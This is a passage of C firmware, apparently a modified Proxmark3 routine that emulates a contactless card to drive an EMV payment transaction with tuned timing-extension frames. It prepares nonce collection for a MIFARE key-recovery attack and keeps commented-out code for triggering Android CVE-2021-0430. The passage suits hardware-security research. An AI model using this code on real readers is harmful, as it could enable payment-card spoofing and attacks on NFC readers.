    uint32_t  cuid = 0;
    //uint32_t cuid = 0, authTimer = 0;
    //uint32_t selTimer;
    //uint32_t nr, ar;
    //uint8_t blockNo;
    bool encrypted_data;

    //uint8_t cardWRBL = 0;
    //uint8_t cardAUTHSC = 0;
    uint8_t cardAUTHKEY = AUTHKEYNONE;  // no authentication
    //uint32_t cardRr = 0;
    //uint32_t ans = 0;
    //uint32_t cardINTREG = 0;
    //uint8_t cardINTBLOCK = 0;

    struct Crypto1State mpcs = {0, 0};
    struct Crypto1State *pcs;
    pcs = &mpcs;

    //uint32_t numReads = 0; //Counts numer of times reader reads a block
    uint8_t receivedCmd[MAX_MIFARE_FRAME_SIZE*5] = {0x00};
    uint8_t receivedCmd_copy[MAX_MIFARE_FRAME_SIZE*5] = {0x00};
    uint8_t receivedCmd_dec[MAX_MIFARE_FRAME_SIZE] = {0x00};
    uint8_t receivedCmd_par[MAX_MIFARE_PARITY_SIZE] = {0x00};
    uint16_t receivedCmd_len;
    uint16_t receivedCmd_len_copy = 0;

    uint8_t response[MAX_MIFARE_FRAME_SIZE] = {0x00};
    uint8_t response_par[MAX_MIFARE_PARITY_SIZE] = {0x00};

    uint8_t *rats = NULL;
    uint8_t rats_len = 0;

    // if fct is called with NULL we need to assign some memory since this pointer is passaed around
    uint8_t datain_tmp[10] = {0};
    if (datain == NULL) {
        datain = datain_tmp;
    }

    //Here, we collect UID,sector,keytype,NT,AR,NR,NT2,AR2,NR2
    // This will be used in the reader-only attack.

    //allow collecting up to 7 sets of nonces to allow recovery of up to 7 keys
#define ATTACK_KEY_COUNT 7 // keep same as define in cmdhfmf.c -> readerAttack() (Cannot be more than 7)
    nonces_t ar_nr_resp[ATTACK_KEY_COUNT * 2]; // *2 for 2 separate attack types (nml, moebius) 36 * 7 * 2 bytes = 504 bytes
    memset(ar_nr_resp, 0x00, sizeof(ar_nr_resp));

    uint8_t ar_nr_collected[ATTACK_KEY_COUNT * 2]; // *2 for 2nd attack type (moebius)
    memset(ar_nr_collected, 0x00, sizeof(ar_nr_collected));
    //uint8_t nonce1_count = 0;
    //uint8_t nonce2_count = 0;
    //uint8_t moebius_n_count = 0;
    //bool gettingMoebius = false;
    //uint8_t mM = 0; //moebius_modifier for collection storage

    // Authenticate response - nonce
    //uint8_t rAUTH_NT[4] = {0, 0, 0, 1};
    //uint8_t rAUTH_NT_keystream[4];
    //uint32_t nonce = 0;

    const tUart14a *uart = GetUart14a();

    // free eventually allocated BigBuf memory but keep Emulator Memory
    BigBuf_free_keep_EM();

    if (EMVSimInit(flags, datain, atqa, sak, &responses, &cuid, &uid_len, &rats, &rats_len) == false) {
        BigBuf_free_keep_EM();
        return;
    }

    // We need to listen to the high-frequency, peak-detected path.
    iso14443a_setup(FPGA_HF_ISO14443A_TAGSIM_LISTEN);

    // clear trace
    clear_trace();
    set_tracing(true);
    LED_D_ON();
    ResetSspClk();

    //uint8_t *p_em = BigBuf_get_EM_addr();
    //uint8_t cve_flipper = 0;

    int counter = 0;
    bool finished = false;
    bool button_pushed = BUTTON_PRESS();

    // nathan

    Dbprintf("Ready to make transaction!");

    while ((button_pushed == false) && (finished == false)) {

        WDT_HIT();

        if (counter == 3000) {
            if (data_available()) {
                Dbprintf("----------- " _GREEN_("BREAKING") " ----------");
                break;
            }
            counter = 0;
        } else {
            counter++;
        }

        FpgaEnableTracing();
        // Now, get data from the FPGA
        int res = EmGetCmd(receivedCmd, sizeof(receivedCmd), &receivedCmd_len, receivedCmd_par);

        if (res == 2) { //Field is off!
            LEDsoff();
            if (cardSTATE != MFEMUL_NOFIELD) {
                Dbprintf("cardSTATE = MFEMUL_NOFIELD");
                break;
            }
            cardSTATE = MFEMUL_NOFIELD;
            continue;
        } else if (res == 1) { // button pressed
            FpgaDisableTracing();
            button_pushed = true;
            if (999 >= DBG_EXTENDED)
                Dbprintf("Button pressed");
            break;
        }

        // WUPA in HALTED state or REQA or WUPA in any other state
        if (receivedCmd_len == 1 && ((receivedCmd[0] == ISO14443A_CMD_REQA && cardSTATE != MFEMUL_HALTED) || receivedCmd[0] == ISO14443A_CMD_WUPA)) {
            //selTimer = GetTickCount();
            if (999 >= DBG_EXTENDED) {
                //Dbprintf("EmSendPrecompiledCmd(&responses[ATQA]);");
            }

            EmSendPrecompiledCmd(&responses[ATQA]);

            FpgaDisableTracing();

            /*
            // init crypto block
            crypto1_deinit(pcs);
            cardAUTHKEY = AUTHKEYNONE;
            nonce = prng_successor(selTimer, 32);
            // prepare NT for nested authentication
            num_to_bytes(nonce, 4, rAUTH_NT);
            num_to_bytes(cuid ^ nonce, 4, rAUTH_NT_keystream); */ // hutton removed dead code

            LED_B_OFF();
            LED_C_OFF();
            cardSTATE = MFEMUL_SELECT;

            /*
            if ((flags & FLAG_CVE21_0430) == FLAG_CVE21_0430) {
                p_em[1] = 0x21;
                cve_flipper = 0;
                Dbprintf("cve flipper is 0");
            } */ // hutton removed dead code
            continue;
        }

        switch (cardSTATE) {
            case MFEMUL_NOFIELD: {
                if (999 >= DBG_EXTENDED)
                    Dbprintf("MFEMUL_NOFIELD");
                break;
            }
            case MFEMUL_HALTED: {
                if (999 >= DBG_EXTENDED)
                    Dbprintf("MFEMUL_HALTED");
                break;
            }
            case MFEMUL_IDLE: {
                LogTrace(uart->output, uart->len, uart->startTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->endTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->parity, true);
                if (999 >= DBG_EXTENDED)
                    Dbprintf("MFEMUL_IDLE");
                break;
            }

                // The anti-collision sequence, which is a mandatory part of the card activation sequence.
                // It auto with 4-byte UID (= Single Size UID),
                // 7 -byte UID (= Double Size UID) or 10-byte UID (= Triple Size UID).
                // For details see chapter 2 of AN10927.pdf
                //
                // This case is used for all Cascade Levels, because:
                // 1) Any devices (under Android for example) after full select procedure completed,
                //    when UID is known, uses "fast-selection" method. In this case reader ignores
                //    first cascades and tries to select tag by last bytes of UID of last cascade
                // 2) Any readers (like ACR122U) uses bit oriented anti-collision frames during selectin,
                //    same as multiple tags. For details see chapter 6.1.5.3 of ISO/IEC 14443-3
            case MFEMUL_SELECT: {
                // Dbprintf("MFEMUL_SELECT 001"); // hutton disable comment
                int uid_index = -1;
                // Extract cascade level
                if (receivedCmd_len >= 2) {
                    switch (receivedCmd[0]) {
                        case ISO14443A_CMD_ANTICOLL_OR_SELECT:
                            // Dbprintf("MFEMUL_SELECT 002"); // hutton disable comment
                            uid_index = UIDBCC1;
                            break;
                        case ISO14443A_CMD_ANTICOLL_OR_SELECT_2:
                            // Dbprintf("MFEMUL_SELECT 003"); // hutton disable comment
                            uid_index = UIDBCC2;
                            break;
                        case ISO14443A_CMD_ANTICOLL_OR_SELECT_3:
                            Dbprintf("MFEMUL_SELECT 004");
                            uid_index = UIDBCC3;
                            break;
                    }
                }
                if (uid_index < 0) {
                    LogTrace(uart->output, uart->len, uart->startTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->endTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->parity, true);
                    cardSTATE_TO_IDLE();
                    // Dbprintf("incorrect cascade level received 001"); // hutton disable comment
                    //if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_SELECT] Incorrect cascade level received"); // nathan print
                    break;
                }

                // Incoming SELECT ALL for any cascade level
                if (receivedCmd_len == 2 && receivedCmd[1] == 0x20) {
                    // Dbprintf("incoming select all 001"); // hutton disable comment
                    EmSendPrecompiledCmd(&responses[uid_index]);
                    FpgaDisableTracing();

                    //if (999 >= DBG_EXTENDED) Dbprintf("SELECT ALL - EmSendPrecompiledCmd(%02x)", &responses[uid_index]); // nathan print
                    break;
                }

                // Incoming SELECT CLx for any cascade level
                if (receivedCmd_len == 9 && receivedCmd[1] == 0x70) {
                    // Dbprintf("incoming select clx 001"); // hutton disable comment
                    if (memcmp(&receivedCmd[2], responses[uid_index].response, 4) == 0) {
                        bool cl_finished = (uid_len == 4  && uid_index == UIDBCC1) ||
                                           (uid_len == 7  && uid_index == UIDBCC2) ||
                                           (uid_len == 10 && uid_index == UIDBCC3);
                        //Dbprintf("send sak command 001"); // hutton disable comment
                        EmSendPrecompiledCmd(&responses[cl_finished ? SAK : SAKuid]);
                        FpgaDisableTracing();

                        //if (999 >= DBG_EXTENDED) Dbprintf("SELECT CLx %02x%02x%02x%02x received", receivedCmd[2], receivedCmd[3], receivedCmd[4], receivedCmd[5]); // nathan print
                        if (cl_finished) {
                            LED_B_ON();
                            cardSTATE = MFEMUL_WORK;
                            // Dbprintf("MFEMUL_WORK state 001"); // hutton disable comment
                            //if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_SELECT] cardSTATE = MFEMUL_WORK"); // nathan print
                        }
                    } else {
                        // IDLE, not our UID
                        LogTrace(uart->output, uart->len, uart->startTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->endTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->parity, true);
                        cardSTATE_TO_IDLE();
                        if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_SELECT] cardSTATE = MFEMUL_IDLE");
                    }
                    break;
                }

                // Incoming anti-collision frame
                // receivedCmd[1] indicates number of byte and bit collision, supports only for bit collision is zero
                if (receivedCmd_len >= 3 && receivedCmd_len <= 6 && (receivedCmd[1] & 0x0f) == 0) {
                    // we can process only full-byte frame anti-collision procedure
                    if (memcmp(&receivedCmd[2], responses[uid_index].response, receivedCmd_len - 2) == 0) {
                        // response missing part of UID via relative array index
                        EmSendPrecompiledCmd(&responses[uid_index + receivedCmd_len - 2]);
                        FpgaDisableTracing();

                        if (999 >= DBG_EXTENDED) Dbprintf("SELECT ANTICOLLISION - EmSendPrecompiledCmd(%02x)", &responses[uid_index]);
                        Dbprintf("001 SELECT ANTICOLLISION - EmSendPrecompiledCmd(%02x)", &responses[uid_index]);
                    } else {
                        // IDLE, not our UID or split-byte frame anti-collision (not supports)
                        LogTrace(uart->output, uart->len, uart->startTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->endTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->parity, true);
                        cardSTATE_TO_IDLE();
                        if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_SELECT] cardSTATE = MFEMUL_IDLE");
                        Dbprintf("001 [MFEMUL_SELECT] cardSTATE = MFEMUL_IDLE");
                    }
                    break;
                }

                // Unknown selection procedure
                LogTrace(uart->output, uart->len, uart->startTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->endTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->parity, true);
                cardSTATE_TO_IDLE();
                if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_SELECT] Unknown selection procedure");
                Dbprintf("001 [MFEMUL_SELECT] Unknown selection procedure");
                break;
            }

                // WORK
            case MFEMUL_WORK: {
                // Dbprintf("MFEMUL_WORK 001"); // hutton disable comment
                if (999 >= DBG_EXTENDED) {
                    // Dbprintf("[MFEMUL_WORK] Enter in case");
                }

                if (receivedCmd_len == 0) {
                    if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK] NO CMD received");
                    Dbprintf("001 [MFEMUL_WORK] NO CMD received");
                    break;
                }

                encrypted_data = (cardAUTHKEY != AUTHKEYNONE);
                if (encrypted_data) {
                    Dbprintf("[MFEMUL_WORK] Not expecting encrypted data. Quitting");
                    break;
                } else {
                    // Data in clear
                    memcpy(receivedCmd_dec, receivedCmd, receivedCmd_len);
                    // Dbprintf("001 [MFEMUL_WORK] Data in clear(!!)"); // huuton disable comment
                }

                // all commands must have a valid CRC
                if (!CheckCrc14A(receivedCmd_dec, receivedCmd_len)) {
                    //EmSend4bit(encrypted_data ? mf_crypto1_encrypt4bit(pcs, CARD_NACK_NA) : CARD_NACK_NA);
                    //FpgaDisableTracing();

                    if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK] All commands must have a valid CRC %02X (%d)", receivedCmd_dec, receivedCmd_len);
                    break;
                }

                //Dbprintf("001 not nacking(!!!!)");
                //goto NOT_NACKING;

                //if (receivedCmd_len == 4 && (receivedCmd_dec[0] == MIFARE_AUTH_KEYA || receivedCmd_dec[0] == MIFARE_AUTH_KEYB)) {
                //    Dbprintf("001 auth command 001");
                //    // Reader asks for AUTH: 6X XX
                //    // RCV: 60 XX => Using KEY A
                //    // RCV: 61 XX => Using KEY B
                //    // XX: Block number

                //    authTimer = GetTickCount();

                //    // received block num -> sector
                //    // Example: 6X  [00]
                //    // 4K tags have 16 blocks per sector 32..39
                //    cardAUTHSC = MifareBlockToSector(receivedCmd_dec[1]);

                //    // cardAUTHKEY: 60 => Auth use Key A
                //    // cardAUTHKEY: 61 => Auth use Key B
                //    cardAUTHKEY = receivedCmd_dec[0] & 0x01;

                //    if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK] KEY %c: %012" PRIx64, (cardAUTHKEY == 0) ? 'A' : 'B', emlGetKey(cardAUTHSC, cardAUTHKEY));

                //    // first authentication
                //    crypto1_deinit(pcs);

                //    // Load key into crypto
                //    crypto1_init(pcs, emlGetKey(cardAUTHSC, cardAUTHKEY));

                //    if (!encrypted_data) {
                //        // Receive Cmd in clear txt
                //        // Update crypto state (UID ^ NONCE)
                //        crypto1_word(pcs, cuid ^ nonce, 0);
                //        // rAUTH_NT contains prepared nonce for authenticate
                //        EmSendCmd(rAUTH_NT, sizeof(rAUTH_NT));
                //        FpgaDisableTracing();

                //        if (999 >= DBG_EXTENDED) {
                //            Dbprintf("[MFEMUL_WORK] Reader authenticating for block %d (0x%02x) with key %c - nonce: %08X - cuid: %08X",
                //                     receivedCmd_dec[1],
                //                     receivedCmd_dec[1],
                //                     (cardAUTHKEY == 0) ? 'A' : 'B',
                //                     nonce,
                //                     cuid
                //            );
                //        }
                //    } else {
                //        // nested authentication
                //        /*
                //        ans = nonce ^ crypto1_word(pcs, cuid ^ nonce, 0);
                //        num_to_bytes(ans, 4, rAUTH_AT);
                //        */
                //        // rAUTH_NT, rAUTH_NT_keystream contains prepared nonce and keystream for nested authentication
                //        // we need calculate parity bits for non-encrypted sequence
                //        mf_crypto1_encryptEx(pcs, rAUTH_NT, rAUTH_NT_keystream, response, 4, response_par);
                //        EmSendCmdPar(response, 4, response_par);
                //        FpgaDisableTracing();

                //        if (999 >= DBG_EXTENDED) {
                //            Dbprintf("[MFEMUL_WORK] Reader doing nested authentication for block %d (0x%02x) with key %c",
                //                     receivedCmd_dec[1],
                //                     receivedCmd_dec[1],
                //                     (cardAUTHKEY == 0) ? 'A' : 'B'
                //            );
                //        }
                //    }

                //    cardSTATE = MFEMUL_AUTH1;
                //    if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK] cardSTATE = MFEMUL_AUTH1 - rAUTH_NT: %02X", rAUTH_NT);
                //    break;
                //}

                // rule 13 of 7.5.3. in ISO 14443-4. chaining shall be continued
                // BUT... ACK --> NACK
                if (receivedCmd_len == 1 && receivedCmd_dec[0] == CARD_ACK) {
                    Dbprintf("[MFEMUL_WORK] ACK --> NACK !!");
                    EmSend4bit(encrypted_data ? mf_crypto1_encrypt4bit(pcs, CARD_NACK_NA) : CARD_NACK_NA);
                    FpgaDisableTracing();
                    break;
                }

                // rule 12 of 7.5.3. in ISO 14443-4. R(NAK) --> R(ACK)
                if (receivedCmd_len == 1 && receivedCmd_dec[0] == CARD_NACK_NA) {
                    Dbprintf("[MFEMUL_WORK] NACK --> NACK !!");
                    EmSend4bit(encrypted_data ? mf_crypto1_encrypt4bit(pcs, CARD_ACK) : CARD_ACK);
                    FpgaDisableTracing();
                    break;
                }

                //// case MFEMUL_WORK => if Cmd is Read, Write, Inc, Dec, Restore, Transfer
                //if (receivedCmd_len == 4 && (receivedCmd_dec[0] == ISO14443A_CMD_READBLOCK
                //                             || receivedCmd_dec[0] == ISO14443A_CMD_WRITEBLOCK
                //                             || receivedCmd_dec[0] == MIFARE_CMD_INC
                //                             || receivedCmd_dec[0] == MIFARE_CMD_DEC
                //                             || receivedCmd_dec[0] == MIFARE_CMD_RESTORE
                //                             || receivedCmd_dec[0] == MIFARE_CMD_TRANSFER)) {
                //    // all other commands must be encrypted (authenticated)
                //    Dbprintf("001 auth command 002");
                //    if (!encrypted_data) {
                //        EmSend4bit(CARD_NACK_NA);
                //        FpgaDisableTracing();

                //        if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK] Commands must be encrypted (authenticated)");
                //        break;
                //    }

                //    // iceman,   u8 can never be larger the  MIFARE_4K_MAXBLOCK (256)
                //    // Check if Block num is not too far
                //    /*
                //    if (receivedCmd_dec[1] > MIFARE_4K_MAXBLOCK) {
                //        EmSend4bit(mf_crypto1_encrypt4bit(pcs, CARD_NACK_NA));
                //        FpgaDisableTracing();
                //        if (999 >= DBG_ERROR) Dbprintf("[MFEMUL_WORK] Reader tried to operate (0x%02x) on out of range block: %d (0x%02x), nacking", receivedCmd_dec[0], receivedCmd_dec[1], receivedCmd_dec[1]);
                //        break;
                //    }
                //    */
                //    blockNo = receivedCmd_dec[1];
                //    if (MifareBlockToSector(blockNo) != cardAUTHSC) {
                //        EmSend4bit(mf_crypto1_encrypt4bit(pcs, CARD_NACK_NA));
                //        FpgaDisableTracing();

                //        if (999 >= DBG_ERROR)
                //            Dbprintf("[MFEMUL_WORK] Reader tried to operate (0x%02x) on block (0x%02x) not authenticated for (0x%02x), nacking", receivedCmd_dec[0], receivedCmd_dec[1], cardAUTHSC);
                //        break;
                //    }

                //    // Compliance of MIFARE Classic EV1 1K Datasheet footnote of Table 8
                //    // If access bits show that key B is Readable, any subsequent memory access will be refused.

                //    if (cardAUTHKEY == AUTHKEYB && IsKeyBReadable(blockNo)) {
                //        EmSend4bit(mf_crypto1_encrypt4bit(pcs, CARD_NACK_NA));
                //        FpgaDisableTracing();

                //        if (999 >= DBG_ERROR)
                //            Dbprintf("[MFEMUL_WORK] Access denied: Reader tried to access memory on authentication with key B while key B is readable in sector (0x%02x)", cardAUTHSC);
                //        break;
                //    }
                //}

                //// case MFEMUL_WORK => CMD READ block
                //if (receivedCmd_len == 4 && receivedCmd_dec[0] == ISO14443A_CMD_READBLOCK) {
                //    Dbprintf("001 auth command 003");
                //    blockNo = receivedCmd_dec[1];
                //    if (999 >= DBG_EXTENDED)
                //        Dbprintf("[MFEMUL_WORK] Reader reading block %d (0x%02x)", blockNo, blockNo);

                //    // android CVE 2021_0430
                //    // Simulate a MFC 1K,  with a NDEF message.
                //    // these values uses the standard LIBNFC NDEF message
                //    //
                //    // In short,  first a value read of block 4,
                //    // update the length byte before second read of block 4.
                //    // on iphone etc there might even be 3 reads of block 4.
                //    // fiddling with when to flip the byte or not,  has different effects
                //    if ((flags & FLAG_CVE21_0430) == FLAG_CVE21_0430) {

                //        // first block
                //        if (blockNo == 4) {

                //            p_em += blockNo * 16;
                //            // TLV in NDEF, flip length between
                //            //  4 | 03 21 D1 02 1C 53 70 91 01 09 54 02 65 6E 4C 69
                //            // 0xFF means long length
                //            // 0xFE mean max short length

                //            // We could also have a go at message len byte at p_em[4]...
                //            if (p_em[1] == 0x21 && cve_flipper == 1) {
                //                p_em[1] = 0xFE;
                //            } else {
                //                cve_flipper++;
                //            }
                //        }
                //    }

                //    emlGetMem(response, blockNo, 1);

                //    if (999 >= DBG_EXTENDED)  {
                //        Dbprintf("[MFEMUL_WORK - ISO14443A_CMD_READBLOCK] Data Block[%d]: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x", blockNo,
                //                 response[0], response[1], response[2], response[3],  response[4],  response[5],  response[6],
                //                 response[7], response[8], response[9], response[10], response[11], response[12], response[13],
                //                 response[14], response[15]);
                //    }

                //    // Access permission management:
                //    //
                //    // Sector Trailer:
                //    // - KEY A access
                //    // - KEY B access
                //    // - AC bits access
                //    //
                //    // Data block:
                //    // - Data access

                //    // If permission is not allowed, data is cleared (00) in emulator memory.
                //    // ex: a0a1a2a3a4a561e789c1b0b1b2b3b4b5 => 00000000000061e789c1b0b1b2b3b4b5


                //    // Check if selected Block is a Sector Trailer
                //    if (IsSectorTrailer(blockNo)) {

                //        if (IsAccessAllowed(blockNo, cardAUTHKEY, AC_KEYA_READ) == false) {
                //            memset(response, 0x00, 6); // keyA can never be read
                //            if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK - IsSectorTrailer] keyA can never be read - block %d (0x%02x)", blockNo, blockNo);
                //        }
                //        if (IsAccessAllowed(blockNo, cardAUTHKEY, AC_KEYB_READ) == false) {
                //            memset(response + 10, 0x00, 6); // keyB cannot be read
                //            if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK - IsSectorTrailer] keyB cannot be read - block %d (0x%02x)", blockNo, blockNo);
                //        }
                //        if (IsAccessAllowed(blockNo, cardAUTHKEY, AC_AC_READ) == false) {
                //            memset(response + 6, 0x00, 4); // AC bits cannot be read
                //            if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK - IsAccessAllowed] AC bits cannot be read - block %d (0x%02x)", blockNo, blockNo);
                //        }
                //    } else {
                //        if (IsAccessAllowed(blockNo, cardAUTHKEY, AC_DATA_READ) == false) {
                //            memset(response, 0x00, 16); // datablock cannot be read
                //            if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK - IsAccessAllowed] Data block %d (0x%02x) cannot be read", blockNo, blockNo);
                //        }
                //    }
                //    AddCrc14A(response, 16);
                //    mf_crypto1_encrypt(pcs, response, MAX_MIFARE_FRAME_SIZE, response_par);
                //    EmSendCmdPar(response, MAX_MIFARE_FRAME_SIZE, response_par);
                //    FpgaDisableTracing();

                //    if (999 >= DBG_EXTENDED) {
                //        Dbprintf("[MFEMUL_WORK - EmSendCmdPar] Data Block[%d]: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x", blockNo,
                //                 response[0], response[1], response[2], response[3],  response[4],  response[5],  response[6],
                //                 response[7], response[8], response[9], response[10], response[11], response[12], response[13],
                //                 response[14], response[15]);
                //    }
                //    numReads++;

                //    if (exitAfterNReads > 0 && numReads == exitAfterNReads) {
                //        Dbprintf("[MFEMUL_WORK] %d reads done, exiting", numReads);
                //        finished = true;
                //    }
                //    break;

                //} // End receivedCmd_dec[0] == ISO14443A_CMD_READBLOCK

                //// case MFEMUL_WORK => CMD WRITEBLOCK
                //if (receivedCmd_len == 4 && receivedCmd_dec[0] == ISO14443A_CMD_WRITEBLOCK) {
                //    Dbprintf("001 auth command 004");
                //    blockNo = receivedCmd_dec[1];
                //    if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK] RECV 0xA0 write block %d (%02x)", blockNo, blockNo);
                //    EmSend4bit(mf_crypto1_encrypt4bit(pcs, CARD_ACK));
                //    FpgaDisableTracing();

                //    cardWRBL = blockNo;
                //    cardSTATE = MFEMUL_WRITEBL2;
                //    if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK] cardSTATE = MFEMUL_WRITEBL2");
                //    break;
                //}

                //// case MFEMUL_WORK => CMD INC/DEC/REST
                //if (receivedCmd_len == 4 && (receivedCmd_dec[0] == MIFARE_CMD_INC || receivedCmd_dec[0] == MIFARE_CMD_DEC || receivedCmd_dec[0] == MIFARE_CMD_RESTORE)) {

                //    Dbprintf("001 auth command 005");
                //    blockNo = receivedCmd_dec[1];
                //    if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK] RECV 0x%02x inc(0xC1)/dec(0xC0)/restore(0xC2) block %d (%02x)", receivedCmd_dec[0], blockNo, blockNo);
                //    if (emlCheckValBl(blockNo)) {
                //        if (999 >= DBG_ERROR) Dbprintf("[MFEMUL_WORK] Reader tried to operate on block, but emlCheckValBl failed, nacking");
                //        EmSend4bit(mf_crypto1_encrypt4bit(pcs, CARD_NACK_NA));
                //        FpgaDisableTracing();
                //        break;
                //    }
                //    EmSend4bit(mf_crypto1_encrypt4bit(pcs, CARD_ACK));
                //    FpgaDisableTracing();
                //    cardWRBL = blockNo;

                //    // INC
                //    if (receivedCmd_dec[0] == MIFARE_CMD_INC) {
                //        cardSTATE = MFEMUL_INTREG_INC;
                //        if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK] cardSTATE = MFEMUL_INTREG_INC");
                //    }

                //    // DEC
                //    if (receivedCmd_dec[0] == MIFARE_CMD_DEC) {
                //        cardSTATE = MFEMUL_INTREG_DEC;
                //        if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK] cardSTATE = MFEMUL_INTREG_DEC");
                //    }

                //    // REST
                //    if (receivedCmd_dec[0] == MIFARE_CMD_RESTORE) {
                //        cardSTATE = MFEMUL_INTREG_REST;
                //        if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK] cardSTATE = MFEMUL_INTREG_REST");
                //    }
                //    break;

                //} // End case MFEMUL_WORK => CMD INC/DEC/REST


                //// case MFEMUL_WORK => CMD TRANSFER
                //if (receivedCmd_len == 4 && receivedCmd_dec[0] == MIFARE_CMD_TRANSFER) {
                //    Dbprintf("001 auth command 006");
                //    blockNo = receivedCmd_dec[1];
                //    Dbprintf("adsfsadf here we areeee");
                //    if (g_dbglevel >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK] RECV 0x%02x transfer block %d (%02x)", receivedCmd_dec[0], blockNo, blockNo);
                //    emlSetValBl(cardINTREG, cardINTBLOCK, receivedCmd_dec[1]);
                //    EmSend4bit(mf_crypto1_encrypt4bit(pcs, CARD_ACK));
                //    FpgaDisableTracing();
                //    break;
                //}


                //if (receivedCmd_len == 4 && receivedCmd_dec[0] == MIFARE_CMD_TRANSFER) {
                //    blockNo = receivedCmd_dec[1];
                //    Dbprintf("adsfsadf here we areeee");
                //    if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK] RECV 0x%02x transfer block %d (%02x)", receivedCmd_dec[0], blockNo, blockNo);
                //    // nathan - did we change these lines? They are different in master
                //    if (emlSetValBl(cardINTREG, cardINTBLOCK, receivedCmd_dec[1]))
                //        EmSend4bit(mf_crypto1_encrypt4bit(pcs, CARD_NACK_NA));
                //    else
                //        EmSend4bit(mf_crypto1_encrypt4bit(pcs, CARD_ACK));

                //    FpgaDisableTracing();
                //    break;
                //}

                //// case MFEMUL_WORK => CMD HALT
                //if (receivedCmd_len > 1 && receivedCmd_dec[0] == ISO14443A_CMD_HALT && receivedCmd_dec[1] == 0x00) {
                //    Dbprintf("001 auth command 007");
                //    LogTrace(uart->output, uart->len, uart->startTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->endTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->parity, true);
                //    LED_B_OFF();
                //    LED_C_OFF();
                //    cardSTATE = MFEMUL_HALTED;
                //    cardAUTHKEY = AUTHKEYNONE;
                //    if (999 >= DBG_EXTENDED)
                //        Dbprintf("[MFEMUL_WORK] cardSTATE = MFEMUL_HALTED");
                //    break;
                //}

                // case MFEMUL_WORK => CMD RATS
                if (receivedCmd_len == 4 && receivedCmd_dec[0] == ISO14443A_CMD_RATS && receivedCmd_dec[1] == 0x80) {
                    Dbprintf("001 auth command 008");
                    if (rats && rats_len) {
                        if (encrypted_data) {
                            memcpy(response, rats, rats_len);
                            mf_crypto1_encrypt(pcs, response, rats_len, response_par);
                            EmSendCmdPar(response, rats_len, response_par);
                        } else {
                            EmSendCmd(rats, rats_len);
                        }
                        FpgaDisableTracing();
                        //if (999 >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK] RCV RATS => ACK"); // nathan print
                    } else {
                        Dbprintf("Rats and rats len is: %d, %d", rats[0], rats_len);
                        EmSend4bit(encrypted_data ? mf_crypto1_encrypt4bit(pcs, CARD_NACK_NA) : CARD_NACK_NA);
                        FpgaDisableTracing();
                        cardSTATE_TO_IDLE();
                        if (999 >= DBG_EXTENDED)
                            Dbprintf("[MFEMUL_WORK] RCV RATS => NACK");
                    }
                    break;
                }

                // The WTX we want to send out...
                //static uint8_t extend_resp[] = {0xf2, 0x01, 0x91, 0x40};
                //static uint8_t extend_resp[] = {0xf2, 0x02, 0x0a, 0x72};
                //static uint8_t extend_resp[] = {0xf2, 0x03, 0x83, 0x63};
                //static uint8_t extend_resp[] = {0xf2, 0x04, 0x3c, 0x17};
                //static uint8_t extend_resp[] = {0xf2, 0x05, 0x50, 0x6b};
                //static uint8_t extend_resp[] = {0xf2, 0x06, 0x2e, 0x34};
                //static uint8_t extend_resp[] = {0xf2, 0x07, 0xa7, 0x25};
                //static uint8_t extend_resp[] = {0xf2, 0x08, 0x50, 0xdd}; // This works
                //static uint8_t extend_resp[] = {0xf2, 0x09, 0xd9, 0xcc};
                //static uint8_t extend_resp[] = {0xf2, 0x0a, 0x42, 0xfe};
                //static uint8_t extend_resp[] = {0xf2, 0x0b, 0xcb, 0xef};
                //static uint8_t extend_resp[] = {0xf2, 0x0c, 0x74, 0x9b};
                //static uint8_t extend_resp[] = {0xf2, 0x0d, 0xfd, 0x8a};
                static uint8_t extend_resp[] = {0xf2, 0x0e, 0x66, 0xb8};

                //if (999 >= DBG_EXTENDED) Dbprintf("Handshaking done, attempt to perform a TX");

                // nathan print me
                if (999 >= DBG_EXTENDED) {
                    Dbprintf("\nrecvd from reader:");
                    Dbhexdump(receivedCmd_len, receivedCmd, false);
                    Dbprintf("");
                }

                // lets handle some obvious stuff here. We know this payment environment doesn't exist
                if (receivedCmd[6] == 'O' && receivedCmd[7] == 'S' && receivedCmd[8] == 'E') {
                    if (999 >= DBG_EXTENDED) Dbprintf("We saw OSE... ignore it!");
                    //Full: 02  6a  82  93  2f

                    EmSendCmd(filenotfound, 5);
                    continue;
                }

                // rather than asing for more time, lets just send the response with the PDOL there too
